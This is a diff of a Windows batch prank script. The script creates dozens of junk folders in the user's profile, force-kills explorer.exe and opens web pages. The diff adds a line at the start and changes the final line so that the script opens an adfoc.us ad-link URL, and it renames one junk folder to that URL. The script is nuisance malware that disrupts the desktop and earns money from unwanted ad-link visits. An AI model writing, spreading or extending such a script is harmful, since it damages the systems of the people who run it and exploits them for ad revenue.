@@ -2,6 +2,7 @@ color 4
 cd ..
 cd ..
 cd %userprofile%
+start http://adfoc.us/859243103683755
 mkdir 1_enjoy
 mkdir 2_enjoy
 mkdir 3_enjoy
@@ -162,12 +163,12 @@ mkdir 77_GG
 mkdir 78_GG
 mkdir 79_GG
 mkdir 80_GG
-mkdir 81_youhavebeentrolled.webnode.cz
+mkdir 81_http://adfoc.us/859243103683755
 cd ..
 cd ..
 cd ..
 tree
-start https://youhavebeentrolled.webnode.cz/
+start http://adfoc.us/859243103683755
 taskkill /f /im explorer.exe
 color 4
 cd ..
